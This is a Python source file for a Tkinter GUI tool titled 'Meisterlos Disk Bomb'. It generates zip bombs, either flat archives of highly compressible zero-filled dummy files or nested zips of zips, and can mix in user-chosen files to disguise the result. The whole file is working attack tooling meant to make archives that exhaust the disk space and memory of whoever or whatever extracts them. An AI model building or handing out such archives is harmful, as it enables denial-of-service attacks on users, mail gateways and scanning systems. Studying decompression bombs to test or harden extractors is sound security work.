#!/usb/bin/env python3

import zlib
import zipfile
import math
import os
import shutil
import sys
import time
import argparse
import tkinter as tk
from tkinter import filedialog, messagebox

def generate_dummy_file(filename, size):
    with open(filename, 'w') as dummy:
        dummy.write((size * 1024 * 1024) * '0')

def make_copies_and_compress(zf, infile, n_copies):
    for i in range(n_copies):
        extension = infile[infile.rfind('.') + 1:]
        basename = infile[:infile.rfind('.')]
        f_name = '%s-%d.%s' % (basename, i, extension)
        shutil.copy(infile, f_name)
        zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(f_name)

def add_file_to_zip(zf, path, include_dir=True):
    """Add directory to zip file"""
    if os.path.isfile(path):
        zf.write(path, compress_type=zipfile.ZIP_DEFLATED)
    elif os.path.isdir(path):
        for root, dirs, files in os.walk(path):
            arc_root = root
            if not include_dir:
                arc_root = root[len(path):]
                if arc_root.startswith(os.sep):
                    arc_root = arc_root[1:]
            for file in files:
                zf.write(os.path.join(root, file), arcname=os.path.join(arc_root, file))

def make_zip_flat(size, out_file, include_dirs, include_files):
    """
    Creates flat zip file without nested zips.
    Zip contains n files each of size size/n and is saved in out_file.
    """
    dummy_name_format = 'dummy{}.txt'

    files_nb = int(size / 100)
    file_size = int(size / files_nb)
    last_file_size = size - (file_size * files_nb)

    if os.path.isfile(out_file):
        os.remove(out_file)

    zf = zipfile.ZipFile(out_file, mode='w', allowZip64=True)

    # Include selected files
    for f in include_files:
        add_file_to_zip(zf, f)

    # Generate and add dummy big files
    if files_nb > 0:
        for i in range(files_nb):
            dummy_name = dummy_name_format.format(i)
            if i == 0:
                generate_dummy_file(dummy_name, file_size)
            else:
                os.rename(dummy_name_format.format(i - 1), dummy_name)
            zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(dummy_name)

    if last_file_size > 0:
        dummy_name = dummy_name_format.format(files_nb)
        generate_dummy_file(dummy_name, last_file_size)
        zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(dummy_name)
    zf.close()
    return files_nb * file_size

def get_files_depth_and_size(total_size):
    """
    Finds a pair of files depth and file size close to given size.
    Idea is to keep both values balanced so there is no situation
    in which there is gazillion files of size 2MB or one file of 1TB
    """
    files_nb = 1
    file_size = 10
    actual_size = files_nb ** files_nb * file_size
    while actual_size < total_size:
        # depth
        inc_files_nb = files_nb + 1
        if inc_files_nb ** inc_files_nb * file_size < total_size:
            files_nb = inc_files_nb
        # file size
        new_file_size = int(total_size / (files_nb ** files_nb))
        if new_file_size > 2 * file_size:
            file_size *= 2
        elif new_file_size == file_size:
            file_size += 1
        else:
            file_size = new_file_size
        actual_size = files_nb ** files_nb * file_size
    return files_nb, file_size

def make_zip_nested(size_MB, out_zip_file, include_dirs, include_files):
    """
    Creates nested zip file (zip file of zip files of zip files etc.).
    """
    if size_MB < 500:
        print('Warning: too small size, using flat mode.')
        return make_zip_flat(size_MB, out_zip_file, include_dirs, include_files)

    depth, file_size = get_files_depth_and_size(size_MB)
    actual_size = depth ** depth * file_size
    print('Warning: Using nested mode. Actual size may differ from given.')

    # Prototype zip file
    dummy_name = 'dummy.txt'
    generate_dummy_file(dummy_name, file_size)
    zf = zipfile.ZipFile('1.zip', mode='w', allowZip64=True)
    zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
    zf.close()
    os.remove(dummy_name)

    for i in range(1, depth + 1):
        zf = zipfile.ZipFile('%d.zip' % (i + 1), mode='w', allowZip64=True)
        make_copies_and_compress(zf, '%d.zip' % i, depth)
        os.remove('%d.zip' % i)
        if i == depth:
            # Include selected files
            for f in include_files:
                add_file_to_zip(zf, f)
        zf.close()
    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
    os.rename('%d.zip' % (depth + 1), out_zip_file)
    return actual_size

def create_zip_bomb():
    mode = mode_var.get()
    size = int(size_entry.get())
    out_file = out_file_entry.get()

    include_files = [d.strip() for d in files_entry.get().strip().split(',') if d != '']

    start_time = time.time()
    if mode == 'flat':
        actual_size = make_zip_flat(size, out_file, [], include_files)
    else:
        actual_size = make_zip_nested(size, out_file, [], include_files)
    end_time = time.time()

    messagebox.showinfo("Completed", f"Compressed File Size: {os.stat(out_file).st_size / 1024.0:.2f} KB\n"
                                    f"Size After Decompression: {actual_size} MB\n"
                                    f"Generation Time: {end_time - start_time:.2f}s")

def select_files():
    filenames = filedialog.askopenfilenames()
    files_entry.delete(0, tk.END)
    files_entry.insert(0, ', '.join(filenames))

def save_file():
    filename = filedialog.asksaveasfilename(defaultextension=".zip")
    out_file_entry.delete(0, tk.END)
    out_file_entry.insert(0, filename)

# Create the main window
root = tk.Tk()
root.title("Meisterlos Disk Bomb")

# Mode selection
mode_label = tk.Label(root, text="Mode:")
mode_label.grid(row=0, column=0, padx=10, pady=10, sticky=tk.W)
mode_var = tk.StringVar(value="flat")
mode_flat = tk.Radiobutton(root, text="Flat", variable=mode_var, value="flat")
mode_flat.grid(row=0, column=1, padx=10, pady=10, sticky=tk.W)
mode_nested = tk.Radiobutton(root, text="Nested", variable=mode_var, value="nested")
mode_nested.grid(row=0, column=2, padx=10, pady=10, sticky=tk.W)

# Size input
size_label = tk.Label(root, text="Size (MB):")
size_label.grid(row=1, column=0, padx=10, pady=10, sticky=tk.W)
size_entry = tk.Entry(root)
size_entry.grid(row=1, column=1, columnspan=2, padx=10, pady=10, sticky=tk.W)

# Files selection
files_label = tk.Label(root, text="Files:")
files_label.grid(row=2, column=0, padx=10, pady=10, sticky=tk.W)
files_entry = tk.Entry(root, width=50)
files_entry.grid(row=2, column=1, padx=10, pady=10, sticky=tk.W)
files_button = tk.Button(root, text="Browse", command=select_files)
files_button.grid(row=2, column=2, padx=10, pady=10, sticky=tk.W)

# Output file
out_file_label = tk.Label(root, text="Output File:")
out_file_label.grid(row=3, column=0, padx=10, pady=10, sticky=tk.W)
out_file_entry = tk.Entry(root, width=50)
out_file_entry.grid(row=3, column=1, padx=10, pady=10, sticky=tk.W)
out_file_button = tk.Button(root, text="Browse", command=save_file)
out_file_button.grid(row=3, column=2, padx=10, pady=10, sticky=tk.W)

# Create button
create_button = tk.Button(root, text="Create ZIP Bomb", command=create_zip_bomb)
create_button.grid(row=4, column=0, columnspan=3, pady=20)

root.mainloop()